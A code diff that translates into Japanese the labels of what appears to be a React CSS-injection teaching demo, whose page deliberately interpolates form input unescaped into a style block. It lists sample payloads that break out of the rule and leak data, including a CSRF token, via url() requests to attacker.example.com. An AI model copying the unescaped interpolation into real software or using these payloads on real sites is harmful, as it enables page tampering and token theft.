@@ -29,18 +29,18 @@
 import { useState } from "react";
 
 const payloads = [
-  { p: "red", note: "benign — sets the color" },
+  { p: "red", note: "通常 — 色を指定" },
   {
     p: "red; } body { background: pink !important; } a {",
-    note: "break out and override the whole page",
+    note: "ルールを抜けてページ全体のスタイルを上書き",
   },
   {
     p: "red; } * { background-image: url(//attacker.example.com/log?c=secret); } b {",
-    note: "exfiltrate via background-image request",
+    note: "background-image リクエストで情報窃取",
   },
   {
     p: 'red; } input[name="csrf"][value^="a"] { background: url(//attacker.example.com/?c=a); } b {',
-    note: "CSRF token leak (attribute selector trick)",
+    note: "属性セレクタを使ったCSRFトークン漏えい",
   },
 ];
 
@@ -57,11 +57,11 @@ export default function CssInjectionPage() {
         }}
       />
 
-      <h1 className="user-theme">CSS Injection Demo</h1>
+      <h1 className="user-theme">CSS インジェクションデモ</h1>
       <p>
-        The heading color comes from a <code>&lt;style&gt;</code> block whose
-        value is interpolated from the form below — no escaping. Inject{" "}
-        <code>{"}"}</code> to break out of the rule and add your own CSS.
+        見出しの色は下のフォームの値をエスケープなしで <code>&lt;style&gt;</code>{" "}
+        ブロックに展開している。<code>{"}"}</code> を注入してルールを抜けると
+        任意のCSSを追加できる。
       </p>
 
       <form
@@ -72,12 +72,12 @@ export default function CssInjectionPage() {
           type="text"
           value={theme}
           onChange={(e) => setTheme(e.target.value)}
-          placeholder="color value"
+          placeholder="色の値"
           style={{ padding: 6, width: 480, border: "1px solid #888" }}
         />
       </form>
 
-      <h3>Payloads to try (click to fill)</h3>
+      <h3>ペイロード例 (クリックで入力欄に反映)</h3>
       <ul style={{ listStyle: "none", padding: 0 }}>
         {payloads.map(({ p, note }) => (
           <li key={p} style={{ margin: "4px 0" }}>
@@ -105,15 +105,15 @@ export default function CssInjectionPage() {
         ))}
       </ul>
 
-      <h3>Generated CSS</h3>
+      <h3>生成されるCSS</h3>
       <pre style={{ background: "#111", color: "#0f0", padding: 12 }}>
         {`.user-theme { color: ${theme}; }`}
       </pre>
 
-      <h3>Sample form (target for exfiltration payload)</h3>
+      <h3>サンプルフォーム (情報窃取ペイロードのターゲット)</h3>
       <p style={{ fontSize: 12, color: "#888" }}>
-        Pretend this is a sensitive form on the page. The CSRF input value
-        below is what the attribute-selector payload tries to leak.
+        ページ内にある機密フォームと想定。下の CSRF input の値が
+        属性セレクタ・ペイロードで漏えいさせようとする対象。
       </p>
       <form onSubmit={(e) => e.preventDefault()}>
         <input type="hidden" name="csrf" value="abc123secret" />
